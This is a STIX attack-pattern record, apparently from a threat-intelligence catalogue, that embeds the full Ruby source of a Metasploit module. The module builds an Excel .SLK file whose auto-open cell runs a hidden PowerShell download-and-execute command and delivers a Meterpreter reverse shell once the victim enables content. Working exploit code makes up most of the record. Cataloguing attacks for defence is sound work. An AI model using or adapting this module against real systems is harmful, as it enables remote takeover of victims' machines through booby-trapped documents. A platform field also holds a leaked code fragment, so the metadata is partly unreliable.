{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4fcb80ad-ebe9-438c-8190-edd808c43c4e",
    "created": "2024-08-14T16:36:34.704385Z",
    "modified": "2024-08-14T16:36:34.704389Z",
    "name": "\"Microsoft Excel .SLK Payload Delivery\"",
    "description": "Q This module generates a download and execute Powershell command to be placed in an .SLK Excel spreadsheet. When executed, it will retrieve a payload via HTTP from a web server. When the file is opened, the user will be prompted to \"Enable Content.\" Once this is pressed, the payload will execute. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/office_excel_slk.rb",
            "external_id": "office_excel_slk.rb"
        },
        {
            "source_name": "reference",
            "url": "https://blog.appriver.com/2018/02/trojan-droppers-using-symbolic-link-files"
        },
        {
            "source_name": "reference",
            "url": "https://www.twitter.com/StanHacked/status/1049047727403937795"
        },
        {
            "source_name": "reference",
            "url": "http://www.irongeek.com/i.php?page=videos/derbycon8/track-3-18-the-ms-office-magic-show-stan-hegt-pieter-ceelen"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule  < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Powershell\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => \"Microsoft Excel .SLK Payload Delivery\",\n      'Description' => %Q{\n        This module generates a download and execute Powershell\n        command to be placed in an .SLK Excel spreadsheet.\n        When executed, it will retrieve a payload via HTTP\n        from a web server. When the file is opened, the\n        user will be prompted to \"Enable Content.\" Once\n        this is pressed, the payload will execute.\n      },\n      'Author' => [\n        'Carter Brainerd', # cbrnrd; Metasploit module\n        'Stan Hegt', # @StanHacked; Discovery\n        'Pieter Ceelen' # @ptrpieter; Discovery\n      ],\n      'License' => MSF_LICENSE,\n      'References' => [\n          ['URL', 'https://blog.appriver.com/2018/02/trojan-droppers-using-symbolic-link-files'],\n          ['URL', 'https://www.twitter.com/StanHacked/status/1049047727403937795'],\n          ['URL', 'http://www.irongeek.com/i.php?page=videos/derbycon8/track-3-18-the-ms-office-magic-show-stan-hegt-pieter-ceelen']\n      ],\n      'Platform' => 'win', # idk about other platforms\n      'Stance' => Msf::Exploit::Stance::Aggressive,\n      'Targets' =>\n        [\n          ['Microsoft Excel', {} ]\n        ],\n      'DisclosureDate' => '2018-10-07',\n      'DefaultTarget' => 0,\n      'Payload' =>\n        {\n          'DisableNops' => true\n        },\n      'DefaultOptions' =>\n        {\n          'DisablePayloadHandler' => false,\n          'PAYLOAD' => 'windows/meterpreter/reverse_tcp',\n          'EXITFUNC' => 'thread'\n        }\n    ))\n\n    register_options([\n      OptString.new('FILENAME', [true, \"Filename to save as\", \"#{rand_text_alphanumeric 8}.slk\"])\n    ])\n  end\n\n  def on_request_uri(cli, request)\n    if request.raw_uri.to_s.end_with? '.slk'\n      print_status(\"Handling request for .slk from #{cli.peerhost}\")\n      payload = gen_psh(\"#{get_uri}\", \"string\")\n      data = create_slk(payload)\n      send_response(cli, data, 'Content-Type' => 'text/plain')\n    else\n      print_status(\"Delivering payload to #{cli.peerhost}...\")\n      p = regenerate_payload(cli)\n      data = cmd_psh_payload(p.encoded, payload_instance.arch.first, remove_comspec: true, exec_in_place: true)\n      send_response(cli, data, 'Content-Type' => 'application/octet-stream')\n    end\n  end\n\n  # I might be able to do without this (using cmd_psh_payload() and encode_final_payload() in Msf::Exploit::Powershell)\n  def gen_psh(url, *method)\n    ignore_cert = Rex::Powershell::PshMethods.ignore_ssl_certificate if ssl\n\n    if method.include? 'string'\n      download_string = datastore['PSH-Proxy'] ? (Rex::Powershell::PshMethods.proxy_aware_download_and_exec_string(url)) : (Rex::Powershell::PshMethods.download_and_exec_string(url))\n    else\n      # Random filename to use, if there isn't anything set\n      random = \"#{rand_text_alphanumeric 8}.exe\"\n      # Set filename (Use random filename if empty)\n      filename = datastore['BinaryEXE-FILENAME'].blank? ? random : datastore['BinaryEXE-FILENAME']\n\n      # Set path (Use %TEMP% if empty)\n      path = datastore['BinaryEXE-PATH'].blank? ? \"$env:temp\" : %Q('#{datastore['BinaryEXE-PATH']}')\n\n      # Join Path and Filename\n      file = %Q(echo (#{path}+'\\\\#{filename}'))\n\n      # Generate download PowerShell command\n      download_string = Rex::Powershell::PshMethods.download_run(url, file)\n    end\n\n    download_and_run = \"#{ignore_cert}#{download_string}\"\n\n    # Generate main PowerShell command\n    return generate_psh_command_line(noprofile: true, windowstyle: 'hidden', command: download_and_run)\n  end\n\n  def create_slk(cmd)\n    content = \"ID;P\\n\"\n    content << \"O;E\\n\"\n    content << \"NN;NAuto_open;ER101C1;KOut Flank;F\\n\"\n    content << \"C;X1;Y101;EEXEC(\\\"#{cmd}\\\")\\n\" # Execute command\n    content << \"C;X1;Y102;EHALT()\\n\"\n    content << \"E\"\n    content\n  end\n\n  def primer\n    file_create(create_slk(gen_psh(\"#{get_uri}\", 'string')))\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-10-07",
    "x_mitre_platforms": [
        "win', # idk about other platforms"
    ]
}